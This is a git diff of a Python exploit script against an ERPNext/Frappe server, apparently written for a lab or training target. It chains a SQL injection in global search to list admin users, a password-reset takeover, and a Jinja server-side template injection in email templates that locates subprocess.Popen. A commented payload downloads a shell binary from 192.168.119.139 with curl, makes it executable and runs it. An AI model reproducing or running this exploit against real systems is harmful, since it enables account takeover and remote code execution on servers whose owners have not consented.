@@ -1,5 +1,7 @@
 import requests
 import json
+import random, string
+import re
 '''
 global websearch returns responses in json
 Ex
@@ -25,6 +27,7 @@ Ex
 }
 
 '''
+
 def get_admin_users(session, url, proxies=None):
     data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select 1,2,3,4, name COLLATE utf8mb4_general_ci FROM __Auth#"}
     res = None
@@ -88,46 +91,51 @@ def reset_password(session, url, reset_token, username, password='@Donkey1234',p
     else:
         print(F"Error in reset_password: {res.status_code}, {res.content}")
         exit(1)
-'''
-def login(session, url, username, password='@Donkey1234', proxies=None):
-    data = {"cmd": "login", "usr": F"{username}", "pwd": F"{password}", "device": "desktop"}
-    res = None
-    if proxies!= None:
-        res = session.post(url, data=data, proxies=proxies)
-    else:
-        res = session.post(url, data=data)
-    if res.status_code == 200:
-        print('here',res.content)
-        res1 = session.get(url + 'desk')
-        #print(res1.content)
 
-    else:
-        print(F"Error logging in: {res.status_code}, {res.content}")
-        exit(1)
-'''
-def create_email_template(session, url, proxies=None):
+def create_email_template(session, url, user, template_name, ssti,proxies=None):
     url += 'api/method/frappe.desk.form.save.savedocs'
-    template_name = "ssti_t23"
-    ssti = "{{7*7}}"
-    data = {
-        "doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 1\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"zeljka.k@randomdomain.com\",\"__newname\":\"%s\",\"subject\":\"%s\",\"response\":\"<div>%s</div>\"}" % (template_name,template_name,ssti),
-        "action": "Save"
-        }
+    data = {"doc": "{\"docstatus\":0,\"doctype\":\"Email Template\",\"name\":\"New Email Template 2\",\"__islocal\":1,\"__unsaved\":1,\"owner\":\"%s\",\"__newname\":\"%s\",\"subject\":\"%s\",\"response\":\"<div>%s</div>\"}" %(user,template_name, template_name, ssti), "action": "Save"}
     res = None
     if proxies!= None:
         res = session.post(url, data=data, proxies=proxies)
     else:
         res = session.post(url, data=data)
-    print(res.content)
     if res.status_code == 200:
-        return template_name
+        return True
     else:
         print(F"Error in create_email_template: {res.status_code}, {res.content}")
         exit(1)
 
-def trigger_ssti_email_template(session, url, proxies=None):
+'''
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{% for x in subclasses_r %}
+{% if 'Popen' in x|attr('__qualname__')%}
+{{ x(["/usr/bin/touch" ,"/tmp/bananas"]) }}
+{{ x(["/usr/bin/curl" ,"http://192.168.119.139/jinja-ssti-test-env/shell-x86.elf", "-o", "/tmp/simpdaddy"]) }}
+{{ x(["/bin/chmod" ,"+x", "/tmp/simpdaddy"]) }}
+{{ x(["/tmp/simpdaddy"]) }}
+{% endif %}
+{% endfor %}
+'''
+def trigger_ssti_email_template(session, url, template_name, user, ssti, proxies=None):
     url += 'api/method/frappe.email.doctype.email_template.email_template.get_email_template'
-    pass
+    data = {"template_name": F"{template_name}", "doc": "{\"name\":\"%s\",\"docstatus\":0,\"subject\":\"%s\",\"parentfield\":null,\"modified_by\":\"%s\",\"doctype\":\"Email Template\",\"response\":\"<div>%s</div>\",\"creation\":\"2022-11-09 10:46:27.926196\",\"modified\":\"2022-11-09 10:46:27.926196\",\"parenttype\":null,\"owner\":\"%s\",\"parent\":null,\"idx\":0,\"__last_sync_on\":\"2022-11-09T15:46:28.016Z\"}" % (template_name,template_name,user,ssti,user), "_lang": ''}
+    res = None
+    if proxies!= None:
+        res = session.post(url, data=data, proxies=proxies)
+    else:
+        res = session.post(url, data=data)
+    if res.status_code == 200:
+        return res.json()
+    else:
+        print(F"Error in trigger_ssti_email_template: {res.status_code}, {res.content}")
+        exit(1)
 
 if __name__ == '__main__':
     url = "http://erpnext:8000/"
@@ -142,5 +150,36 @@ if __name__ == '__main__':
     request_password_reset(session, url, user)
     reset_token = extract_password_reset_token(session, url, user)
     reset_password(session, url, reset_token, user)
-    #login(session, url, user)
-    create_email_template(session, url)
+
+    # at this poing we are effectively logged in to the application
+
+    template_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
+    # a template to enumerate all of the subclasses of object
+    # we are interested in the index of open
+    ssti = '{% set string = \\\"ssti\\\" %} {% set class = \\\"__class__\\\" %} {% set mro = \\\"__mro__\\\" %} {% set subclasses = \\\"__subclasses__\\\" %} {% set mro_r = string|attr(class)|attr(mro) %} {% set subclasses_r = mro_r[1]|attr(subclasses)() %} {{ subclasses_r }}'
+    print(template_name)
+    create_email_template(session, url, user, template_name, ssti)
+    res = trigger_ssti_email_template(session, url, template_name, user, ssti)
+    classes = res['message']['message']
+    classes = re.sub(r'^.*?\[','', classes)
+    classes = re.sub(r']</div>$','', classes)
+    #classes = re.sub(r'"','', classes)
+    classes = classes.split(', ') 
+#    classes = re.split(',\s?<', classes)
+    #print(classes)
+    print(classes[150])
+    print(classes[151])
+    print(classes[152])
+    print(classes[153])
+    print('Num classes: ',len(classes))
+    count = 0
+    popen_index = -1
+    for c in classes:
+        if 'class' not in c:
+            print(F'index: {count} | {c}')
+        if 'subprocess.Popen' in c:
+            #print(F'index: {count} | {c}')
+            popen_index = count
+            break
+        count += 1
+    print(F'popen index:{popen_index}')
